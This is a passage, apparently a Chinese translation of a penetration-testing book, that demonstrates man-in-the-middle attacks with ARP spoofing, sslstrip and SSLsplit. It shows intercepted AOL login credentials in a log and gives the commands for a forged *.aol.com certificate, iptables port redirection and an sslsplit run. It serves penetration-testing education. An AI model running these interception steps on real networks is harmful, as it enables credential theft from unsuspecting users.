  \ is-at 0:c:29:f8:7b:ae\n```\n\n现在 sslstrip 已全部设置好，我只需要拦截一些流量并开始获取信息。根据其他之前的情报，我将拦截来自\
  \ 192.168.33.xxx 的流量。我将像上一节那样设置我的 ARP 欺骗，并让我的设备位于该终端用户和互联网之间。一旦就位，我可以 tail 日志文件，看看是否能获得任何有用的信息：\n\
  \n```\nroot@pi-kali:~# more sslstrip.log\n2017-02-10 02:37:33,616 SECURE POST Data\
  \ (my_screenname.aol.com):\nsitedomain=&lang=en&locale=us&authlev=1&siteState=&isSiteStateBase64=false&isSiteStateEncoded=false&mcState=initialized&uitype=std&use_am0=&offerId=&seamless=&regPromoCode=&doSSL=&redirectType=&chk=false&isoDP=&usrId=0uilhcJibopAicla\
  \ loginId=pentester%40gmail.com\npassword=CanYouSeeMyPassword rememberMe=off\n```\n\
  \n\n\n正如你所见，我确实在日志文件中获取了一些凭据。然而，最终用户应该注意的是，浏览器不再安全。地址栏中没有锁图标。如果我关闭 MiTM 攻击和 sslstrip，你会再次看到锁图标：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_131_0.png)\n\n攻击结束后在同一站点：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_131_1.png)\n\
  \n## 使用 SSLsplit 拦截 SSL 流量\n\nSSLsplit 与 sslstrip 类似；在此，你可以拦截 SSL 流量以获取凭据和其他你希望保持机密的信息。然而，主要区别在于\
  \ SSLsplit 使用我生成给最终用户的证书。这样，连接在最终用户端仍会保持 SSL，而不像 sslstrip，会以 HTTP 连接返回给最终用户。唯一需要注意的是，你创建的证书需要放入用户的受信任证书存储中，这样用户就不会看到不受信任的证书消息。\n\
  \n我必须做的第一件事是创建证书。这里重要的是为我想要拦截的站点创建证书。\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_131_2.png)\n\
  \n并非必须为用户创建与要拦截的站点匹配的证书。然而，如果你选择另一个站点，用户会看到站点不匹配错误，并且如果他们查看证书，会发现它是由另一个站点颁发的。你始终希望尽可能多地隐藏最终用户的信息。\n\
  \n为了为我将进行 MiTM 攻击的站点创建证书，我将从 CLI 运行以下命令：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_132_0.png)\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_132_1.png)\n\n你会注意到我指定了一个通配域名 (*.aol.com)。请确保对你想要拦截的域名进行研究。在这种特定情况下，在访问主站点后，登录时会重定向到不同的子域名。此证书将涵盖所有这些域名。\n\
  \n一旦证书全部设置好，你需要一种机制将其放到最终用户的机器上。在本实验中，我们将假设证书已在最终用户机器上。如果由于某种原因没有，他们仍然可以登录站点并允许我们窃取其凭据；用户只会收到证书错误。\n\
  \n我们需要对 `sysctl` 进行一些更改，以及 iptables 进行一些重定向。类似于 `sslstrip` 和 `arpspoof`，我们需要确保数据包在线路上被转发。根据之前的配置，这应该已经设置好了，但如果没有，这里是我将使用的命令：\n\
  \n```\nsysctl -w net.ipv4.ip_forward=1\n```\n\n接下来，我将把计划监听的任何端口重定向到我将运行 `sslsplit`\
  \ 的端口。你可以重定向 HTTP、SMTP over SSL 或 FTP 等。我将拦截 HTTPS，因此我将重定向 8443：\n\n```\niptables\
  \ -t nat -F\n```\n\n```\niptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT\
  \ --to-ports 8443\n```\n\n由于我的准备工作已全部完成，我现在可以开始运行 `sslsplit`。有很多选项可供选择。我通常运行 -D\
  \ 以调试模式获取屏幕上的更多信息。我还指定日志文件、监狱目录以及用于单独文件的日志目录。我还指定密钥和证书，设置 SSL 以及监听地址和端口。以下是我的 CLI\
  \ 输出：\n\n```\nroot@pi-kali:~# sslsplit -D -l connections.log -j /tmp/sslsplit/ -S\
  \ logdir/ -k aol.key -c aol.crt ssl 0.0.0.0 8443\nGenerated RSA key for leaf certs.\n\
  SSLSplit 0.5.0 (built 2016-12-26)\nCopyright (c) 2009-2016, Daniel Roethlisberger\
  \ <daniel@roe.ch>\nhttp://www.roe.ch/SSLSplit\nBuild info: V:FILE\nFeatures: -DHAVE_NETFILTER\n\
  NAT engines: netfilter* tproxy\nnetfilter: IP_TRANSPARENT SOL_IPV6 !IPV6_ORIGINAL_DST\n\
  Local process info support: no\ncompiled against OpenSSL 1.1.0c 10 Nov 2016 (1010003f)\n\
  was linked against OpenSSL 1.1.0c 10 Nov 2016 (1010003f)\nOpenSSL has support for\
  \ TLS extensions\nTLS Server Name Indication (SNI) supported\nOpenSSL is thread-safe\
  \ with THREADID\nUsing SSL_MODE_RELEASE_BUFFERS\nSSL/TLS protocol availability:\
